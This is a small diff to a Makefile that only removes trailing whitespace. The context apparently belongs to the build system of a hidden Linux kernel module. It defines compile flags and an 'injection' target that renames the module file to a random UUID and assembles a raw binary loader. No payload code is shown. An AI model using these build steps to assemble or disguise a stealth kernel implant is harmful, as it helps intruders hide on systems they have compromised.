@@ -23,7 +23,7 @@ endif
 COMPILER_OPTIONS := -Wall -Wno-vla -DPROCNAME='"$(PROCNAME)"' \
 	-DMODNAME='"ave"' -DKSOCKET_EMBEDDED ${DEBUG_PR} -DCPUHACK \
 	-DCPUHACK -DPRCTIMEOUT=$(PRCTIMEOUT) -DUUIDGEN=\"$(UUIDGEN)\" \
-	-DJOURNALCTL=\"$(JOURNALCTL)\" 
+	-DJOURNALCTL=\"$(JOURNALCTL)\"
 
 EXTRA_CFLAGS := -I$(src)/src -I$(src)/fs ${COMPILER_OPTIONS}
 
@@ -65,7 +65,7 @@ endif
 
 injection:
 	sed -i "s|.av.ko|${UUIDGEN}.ko|g" $(injection).S
-	sed -i "s|.up.sh|.up.sh|g" $(injection).S 
+	sed -i "s|.up.sh|.up.sh|g" $(injection).S
 	$(AS) --64 $(injection).S -statistics -fatal-warnings \
 		-size-check=error -o $(injection).o
 	$(LD) -Ttext 200000 --oformat binary -o $(injection) $(injection).o
